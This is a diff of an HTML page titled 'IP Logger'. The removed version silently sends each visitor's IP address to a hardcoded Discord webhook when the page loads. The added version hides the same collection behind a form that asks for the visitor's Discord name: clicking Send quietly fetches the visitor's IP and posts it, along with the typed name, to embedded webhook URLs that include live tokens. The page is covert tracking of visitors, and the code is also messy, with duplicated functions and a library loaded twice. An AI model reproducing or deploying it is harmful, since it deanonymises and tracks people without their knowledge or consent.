@@ -1,31 +1,130 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <title>Ip logger</title>
-    </head>
-    <body>
+<head>
+  <title>IP Logger</title>
+  <style>
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 50px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: #f9f9f9;
+      font-family: Arial, sans-serif;
+    }
 
-    <h1>Is pages of is logger</h1>    
-    <p>To send discord webhooks</p>
+    h1 {
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 8px 16px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      display: block;
+      margin : auto;
+  
+    }
 
 
-    <script>
-        function getIP(json) {
-          var request = new XMLHttpRequest(); 
-              request.open("POST", "https://discord.com/api/webhooks/1126075440751202335/5hDJzS6Hp3yTG9WHXXNBuwp8ub0TcO37SB2oAgnih6sE08p-XjXL37TeAhraOZIIY5Re");
-        
-              request.setRequestHeader('Content-type', 'application/json');
-        
-              var params = {
-                username: "Logger",
-                avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
-                content: "**IP:** ```" + json.ip + "*```"
-              }
-        
-              request.send(JSON.stringify(params));
-            }
-        
-        </script>
-        <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
-    </body>
+  </style>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      var webhookUrl = "https://discord.com/api/webhooks/1126122555531608074/2PyEihmG-j9QtM3vsKNUOugqogObAeVSEmFB3sq5htta_remCBDS1lleKpxHX_dskdO5"; 
+
+      function sendWebhook(ip) {
+        var payload = {
+          content: "Nouvelle adresse IP enregistrée: " + ip
+        };
+
+        $.ajax({
+          url: webhookUrl,
+          type: "POST",
+          data: JSON.stringify(payload),
+          contentType: "application/json",
+          success: function() {
+            showSuccessMessage("Message send ");
+          },
+          error: function() {
+            showErrorMessage("");
+          }
+        });
+      }
+
+      function showSuccessMessage(message) {
+        $("#success-message").text(message).show();
+        $("#error-message").hide();
+      }
+
+      function showErrorMessage(message) {
+        $("#success-message").hide();
+        $("#error-message").text(message).show();
+      }
+
+      $("#send-button").click(function() {
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+          var ip = data.ip;
+          sendWebhook(ip);
+          $("#ip").text("Adresse IP enregistrée : ");
+        });
+      });
+    });
+    $(document).ready(function() {
+      var webhookUrl = "https://discord.com/api/webhooks/1126075440751202335/5hDJzS6Hp3yTG9WHXXNBuwp8ub0TcO37SB2oAgnih6sE08p-XjXL37TeAhraOZIIY5Re"; 
+
+      $("#send-button").click(function() {
+        var message = $("#message-input").val();
+
+        if (message) {
+          sendWebhook(message);
+        }
+      });
+
+      function sendWebhook(message) {
+        var payload = {
+          content: message
+        };
+
+        $.ajax({
+          url: webhookUrl,
+          type: "POST",
+          data: JSON.stringify(payload),
+          contentType: "application/json",
+          success: function() {
+            showMessage("Message send to succès ");
+          },
+          error: function() {
+            showMessage("");
+          }
+        });
+      }
+
+      function showMessage(message) {
+        $("#message-input").val("");
+        $("#message-output").text(message);
+      }
+    });
+  </script> <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+<body>
+  <div class="container">
+    <h1>Discord</h1>
+    <div class="form-group">
+      <label for="message-input">Write your discord name :</label>
+      <input type="text" id="message-input" placeholder="discord#0000">
+    </div>
+    <button id="send-button">Send</button>
+    <p id="message-output"></p>
+  </div>
+</body>
+</head>
 </html>
